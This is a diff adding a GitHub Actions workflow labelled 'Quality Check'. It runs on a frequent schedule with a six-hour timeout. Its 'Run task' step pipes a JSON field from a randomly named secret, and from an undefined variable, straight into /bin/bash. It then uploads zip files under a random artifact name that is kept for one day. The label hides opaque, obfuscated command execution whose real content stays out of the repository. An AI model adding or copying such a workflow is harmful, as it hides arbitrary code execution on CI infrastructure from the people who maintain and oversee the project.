@@ -1,0 +1,30 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '17 1,7,13,19 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run task
+        env:
+          twun4784: ${{ secrets.twun4784 }}
+        run: |
+          printf '%s' "$twun4784" | jq -r .j9 | /bin/bash
+          echo $mat99 | jq -r .meb232 | /bin/bash
+
+      - name: Store output
+        uses: actions/upload-artifact@v4
+        with:
+          name: xClpHoEb
+          path: "*.zip"
+          retention-days: 1
